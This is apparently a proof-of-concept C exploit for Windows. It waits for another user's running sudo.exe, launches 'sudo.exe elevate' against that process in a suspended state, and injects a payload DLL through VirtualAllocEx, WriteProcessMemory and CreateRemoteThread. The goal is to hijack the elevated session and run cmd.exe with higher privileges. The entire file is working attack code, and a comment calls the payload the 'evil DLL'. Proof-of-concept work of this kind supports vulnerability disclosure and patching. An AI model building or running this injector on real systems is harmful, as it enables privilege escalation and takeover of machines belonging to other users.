#include <Windows.h>
#include <psapi.h>
#include <stdio.h>
#include <Lmcons.h>


static HANDLE inject_dll(HANDLE processHandle, char dllName[]);
static HANDLE spawn_target(char*);
DWORD FindRunningSudo();
char defaultPayload[] = "C:\\sudo-dll-payload.dll";
const char* kSudoFile = "C:\\Windows\\System32\\sudo.exe";
const char* kSudoCmdLineFormat = "sudo.exe elevate -p %u cmd.exe";

char g_CurrentUser[UNLEN];


/*
Usage: sudo-dll-injector.exe 'cmd to run' <dll to inject>
*/
int main(int argc, char **argv) {
	char* payload;
	if (argc >= 3) {
		payload = argv[2];
	}
	else {
		payload = defaultPayload;
	}

	printf("Going to inject %s into a controlled process to run '%s'\n", payload, argv[1]);
	DWORD szCurrentUserLen = UNLEN;
	GetUserName(g_CurrentUser, &szCurrentUserLen);

	HANDLE controlled_process = spawn_target(payload);
	WaitForSingleObject(controlled_process, INFINITE);
}

static HANDLE inject_dll(HANDLE proccessHandle, char dllName[]) {
	HMODULE hKernel32 = GetModuleHandle("Kernel32");
	if (hKernel32 == NULL) {
		return NULL;
	}
	VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");
	if (lb == NULL) {
		printf("Couldn't find LoadLibraryA\n");
		return NULL;
	}

	size_t dllNameLen = strlen(dllName);
	// allocate memory buffer for remote process
	void *rb = VirtualAllocEx(proccessHandle, NULL, dllNameLen + 1, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (rb == NULL) {
		return NULL;
	}

	// "copy" evil DLL between processes
	WriteProcessMemory(proccessHandle, rb, dllName, dllNameLen, NULL);

	// our process start new thread
	HANDLE rt = CreateRemoteThread(proccessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
	if (rt == NULL) {
		printf("Cannot create remote thread.");
		CloseHandle(proccessHandle);
		return NULL;
	}

	printf("Successfully injected DLL and called LoadLibraryA on it.\n");
	WaitForSingleObject(rt, INFINITE);

	return rt;
}


static HANDLE spawn_target(char *path_to_payload) {
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	DWORD dwTargetPid = NULL;
	char szTargetCmdLine[256];

	si.cb = sizeof(si);
	while (dwTargetPid == NULL) {
		dwTargetPid = FindRunningSudo();
	}
	snprintf(szTargetCmdLine, 256, kSudoCmdLineFormat, dwTargetPid);
	printf("Running '%s'\n", szTargetCmdLine);

	HRESULT createProcessResult = CreateProcessA(kSudoFile, szTargetCmdLine, 0, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if (createProcessResult == 0) {
		printf("Creating the target failed.\n");
		return FALSE;
	}

	HANDLE remoteThread = inject_dll(pi.hProcess, path_to_payload);
	if (remoteThread == NULL) {
		printf("Injecting payload failed.\n");
		return FALSE;
	}

	// Modify suspended process

	ResumeThread(pi.hThread);
	return pi.hProcess;
}

DWORD FindRunningSudo() {
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		return NULL;
	}


	// Calculate how many process identifiers were returned.

	cProcesses = cbNeeded / sizeof(DWORD);

	// Print the name and process identifier for each process.

	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0 && aProcesses[i] != GetCurrentProcessId())
		{
			HANDLE proccesHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, aProcesses[i]);
			if (NULL != proccesHandle)
			{
				HANDLE hProcessToken = NULL;
				char lpName[260];
				char lpDomain[260];
				if (OpenProcessToken(proccesHandle, TOKEN_QUERY, &hProcessToken)) {
					DWORD dwSize = 128;
					PTOKEN_USER ptu = (TOKEN_USER*)LocalAlloc(LMEM_FIXED, dwSize);
					if (GetTokenInformation(hProcessToken, TokenUser, ptu, dwSize, &dwSize)) {
						SID_NAME_USE SidType;
						if (LookupAccountSid(NULL, ptu->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType)) {
							if (strcmp(lpName, g_CurrentUser) == 0) {
								continue;
							}
						}
					}
				}

				char szProcessName[MAX_PATH] = "<unknown>";
				DWORD dwLen = MAX_PATH;
				QueryFullProcessImageNameA(proccesHandle, 0, szProcessName, &dwLen);
				if (strcmp(szProcessName, "C:\\Windows\\System32\\sudo.exe") == 0) {
					printf("Found target sudo proccess %i\n", aProcesses[i]);
					return aProcesses[i];
				}
			}
		}
	}
	return NULL;
}